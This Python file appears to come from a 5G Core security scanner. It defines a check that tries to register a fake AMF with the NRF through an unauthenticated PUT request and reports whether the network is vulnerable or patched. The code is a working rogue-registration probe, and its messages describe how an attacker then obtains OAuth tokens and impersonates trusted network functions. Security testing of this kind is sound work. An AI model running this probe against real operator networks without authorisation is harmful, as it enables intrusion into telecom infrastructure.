from checks.base_check import BaseCheck, CheckResult
from core import http_client, nf_identity
from config import NRF_URL

class RogueNFRegistrationCheck(BaseCheck):
    check_id = "CHECK-002"
    name = "Rogue NF Registration"
    affected_nf = "NRF"
    endpoint = "PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}"
    severity = "CRITICAL"

    def run(self) -> CheckResult:
        profile = nf_identity.get_rogue_nf_profile()
        nf_id = nf_identity.get_nf_instance_id()
        url = f"{NRF_URL}/nnrf-nfm/v1/nf-instances/{nf_id}"

        try:
            resp = http_client.put(url, json=profile)

            request = {
                "method": "PUT",
                "url": url,
                "body": profile
            }
            response = {
                "status_code": resp.status_code,
                "body": resp.text[:500]
            }

            if resp.status_code in [200, 201]:
                return self.result(
                    status="VULNERABLE",
                    request=request,
                    response=response,
                    evidence=f"NRF accepted rogue NF registration with status {resp.status_code}",
                    conclusion="NRF registered our fake AMF with no identity verification. "
                               "Attacker can now obtain legitimate OAuth tokens and "
                               "impersonate a trusted NF across the entire 5G Core."
                )
            elif resp.status_code == 401:
                return self.result(
                    status="PATCHED",
                    request=request,
                    response=response,
                    evidence="NRF returned 401 — registration requires authentication",
                    conclusion="NRF enforces authentication on registration. "
                               "Rogue NF registration blocked."
                )
            elif resp.status_code == 403:
                return self.result(
                    status="PATCHED",
                    request=request,
                    response=response,
                    evidence="NRF returned 403 — registration forbidden",
                    conclusion="NRF rejected rogue NF registration."
                )
            else:
                return self.result(
                    status="ERROR",
                    request=request,
                    response=response,
                    evidence=f"Unexpected status code {resp.status_code}",
                    conclusion="Unexpected response from NRF."
                )
        except Exception as e:
            return self.result(
                status="ERROR",
                request={"method": "PUT", "url": url},
                response={},
                evidence=str(e),
                conclusion="Could not reach NRF."
            )